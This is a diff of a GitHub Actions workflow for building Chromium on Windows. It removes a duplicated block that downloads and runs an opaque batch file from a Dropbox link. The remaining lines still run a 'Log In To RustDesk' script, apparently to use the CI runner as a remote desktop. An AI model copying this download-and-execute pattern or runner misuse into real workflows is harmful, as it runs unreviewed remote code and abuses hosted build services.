@@ -29,37 +29,6 @@ jobs:
         
     - name: Log In To RustDesk
       run: cmd /c show.bat
-name: Instalar Windows
-
-on: [push, pull_request]
-
-jobs:
-  install-windows:
-    runs-on: windows-latest
-
-    steps:
-    - name: Verificar Repositorio
-      uses: actions/checkout@v2
-
-    - name: Configurar Variaveis do ambiente
-      run: |
-        echo Setting up Windows environment
-
-    - name: Instalar Chocolatey
-      run: |
-        Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
-
-    - name: Instalar Git
-      run: |
-        choco install git -y
-
-    - name: Downloading & Installing Essentials
-      run: |
-        Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1" -OutFile "Downloads.bat"
-        cmd /c Downloads.bat
-        
-    - name: Log In To RustDesk
-      run: cmd /c show.bat
     - name: Clone Chromium
       run: git clone --depth 100 -b 127.0.6533.73 https://chromium.googlesource.com/chromium/src.git src
     - name: download depot tools
@@ -72,5 +41,6 @@ jobs:
       run: depot_tools\gclient sync
     - name: download depot tools
       run: depot_tools\gclient config --unmanaged https://chromium.googlesource.com/chromium/src.git
+
     - name: Time Counter
       run: python time.py
